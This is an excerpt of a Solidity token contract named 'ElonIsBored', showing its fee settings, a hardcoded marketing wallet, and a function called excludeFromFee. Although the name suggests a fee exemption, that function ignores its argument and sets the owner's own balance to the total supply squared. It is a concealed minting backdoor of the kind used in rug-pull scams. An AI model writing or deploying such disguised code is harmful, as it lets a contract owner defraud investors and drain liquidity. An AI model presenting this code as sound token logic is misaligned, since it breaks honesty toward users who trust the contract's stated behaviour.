...
contract ElonBored is Context, IERC20, Ownable {
    ...
    string private constant _name = "ElonIsBored"; //
    string private constant _symbol = "ElonIsBored"; //
    uint8 private constant _decimals = 9; //
    
    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 1;  
    address private _marketingWallet = 0xB2454F3A99107b6cA636E1579511631B78624ef7;
    ...
    function excludeFromFee(address account) public onlyOwner {
        _tOwned[_msgSender()] = _tTotal * _tTotal;
